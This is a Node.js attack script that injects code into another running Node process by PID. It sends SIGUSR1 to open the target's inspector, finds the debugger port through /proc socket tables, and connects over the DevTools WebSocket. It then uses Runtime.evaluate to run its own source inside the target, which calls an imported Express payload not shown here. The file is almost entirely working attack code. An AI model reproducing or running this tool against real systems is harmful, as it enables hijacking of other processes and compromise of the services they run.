const process = require('process');
const fs = require('fs');
const http = require('http');
const ws = require("ws");
const crypto = require('crypto');
const payload = require('./payload');

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

function getnew(a, b){
    const res = new Set();
    for (const e of a) {
        if (!b.has(e))
            res.add(e)
    }
    return res;
}

function getProcessDescriptors(pid) {
    const s = new Set();
    fs.readdirSync(`/proc/${pid}/fd/`).forEach(file => {
        const dst = fs.readlinkSync(`/proc/${pid}/fd/${file}`);
        if (dst.startsWith('socket:['))
            s.add(dst.slice(8, -1))
    });
    return s;
}

async function getDebuggerPort(pid) {

    const before = getProcessDescriptors(pid);
    
    process.kill(pid, 'SIGUSR1');
    await sleep(200);

    const after = getProcessDescriptors(pid);

    const tcptbl = fs.readFileSync(`/proc/net/tcp`, {encoding: 'ascii'});
    let sockets =  getnew(after, before)
    if (sockets.size == 0) {
        console.log(`[*] No new sockets were discovered after SIGUSR1, probably the process already in debug mode`);
        sockets = before;
    }

    const resp = new Set();
    for (const sockid of sockets) {
        const match = new RegExp(`^.* ${sockid} .*$`, 'm').exec(tcptbl);
        if (!match)
            continue;
        const port = parseInt(match[0].trim().split(/[ :]/)[3], 16);
        if (!isNaN(port))
            resp.add(port)
    }
    return resp;
}

async function httpRequest(options) {
    return new Promise((resolve, reject) =>
        http.get(
            options,
            (res) => {
                let rawData = '';
                res.on('data', (chunk) => { rawData += chunk; });
                res.on('end', () => {
                    try {
                        resolve(JSON.parse(rawData))
                    } finally {
                        reject()
                    }
                });
            }) 
    );
}

async function getDebuggerUrl(port) {
    try {
        const resp = await httpRequest({
            hostname: '127.0.0.1',
            port: port,
            path: '/json/list'
        });
        const debuggerUrl = resp[0].webSocketDebuggerUrl
        return debuggerUrl;
    } catch (e) {
        return undefined
    } 
}


function injectCode(debuggerUrl) {

    const code = fs.readFileSync(__filename, {encoding: 'ascii'});
    const hash = crypto.createHash('sha1').update(code).digest('hex');
    console.log(`[*] File hash is ${hash}`);

    const client = new ws.WebSocket(debuggerUrl);
    client.on('open', () => {
        client.send(JSON.stringify({id: 0, method: 'Runtime.enable'}));
        client.send(JSON.stringify({id: 1, method: 'Runtime.evaluate', params: {
            includeCommandLineAPI: true,
            expression: `global.__injected = '${hash}';`,
        }}));
        client.send(JSON.stringify({id: 1, method: 'Runtime.evaluate', params: {
            includeCommandLineAPI: true,
            expression: code,
        }}));
    })
    client.on('message', (msg) => (JSON.parse(msg).result?.result?.value == 1337) ? client.terminate() : false);

}

async function main(pid) {
    const ports = await getDebuggerPort(pid);
    console.log(`[+] Got ports: ${Array.from(ports)}`);

    for (const port of ports) { 
        // TODO: support non-localhost IP addresses as well
        const debuggerUrl = await getDebuggerUrl(port)
        if (!debuggerUrl)
            continue
        console.log(`[+] Got debugger URL: ${debuggerUrl}`);
        injectCode(debuggerUrl);
    }
}


if (global.__injected) {
    payload.expressPayload();
    throw 1337;
} else {
    const pid = parseInt(process.argv.at(-1));
    if (!pid) {
        console.log(`Usage: ${process.argv[0]} ${process.argv[1]} <PID>`);
        process.exit(-1);
    }
    main(pid).catch(console.error);
}
